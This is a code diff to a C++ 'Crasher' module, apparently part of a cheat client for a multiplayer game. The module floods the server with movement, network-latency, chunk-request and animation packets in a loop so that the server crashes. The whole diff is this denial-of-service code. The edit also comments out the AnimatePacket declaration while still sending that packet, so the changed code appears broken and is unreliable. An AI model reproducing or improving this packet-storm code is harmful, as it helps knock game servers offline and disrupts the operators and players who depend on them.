@@ -14,7 +14,6 @@ public:
 	}
 	~Crasher(){};
 
-	// Inherited via IModule
 	virtual const char* getModuleName() override { return ("Crasher"); }
 	virtual void onSendPacket(C_Packet* packet) override {
 		if (CrasherMode.selected == 0) {
@@ -42,16 +41,17 @@ public:
 			setEnabled(false);
 		C_MovePlayerPacket MovePlayerPacket(g_Data.getLocalPlayer(), *g_Data.getLocalPlayer()->getPos());
 		NetworkLatencyPacket NetworkPacket;
+		NetworkPacket.timeStamp = 6;
 		C_SubChunkRequestPacket ChunkRequestPacket;
-		C_PlayerActionPacket PlayerActionPacket;
-		C_AnimatePacket AnimatePacket;
+		//C_PlayerActionPacket PlayerActionPacket;
+		//C_AnimatePacket AnimatePacket;
 		//CommandRequestPacket CommandRequestPacket("FADEAWAY ON TOP");
 		if (CrasherMode.selected == 1) {
+			g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&ChunkRequestPacket);
 			for (int PacketStorm = 0; PacketStorm < CrasherPPS; PacketStorm++) {
 				g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&MovePlayerPacket);
 				g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&NetworkPacket);
-				g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&ChunkRequestPacket);
-				g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&PlayerActionPacket);
+				//g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&PlayerActionPacket);
 				g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&AnimatePacket);
 				//g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&CommandRequestPacket);
 			}
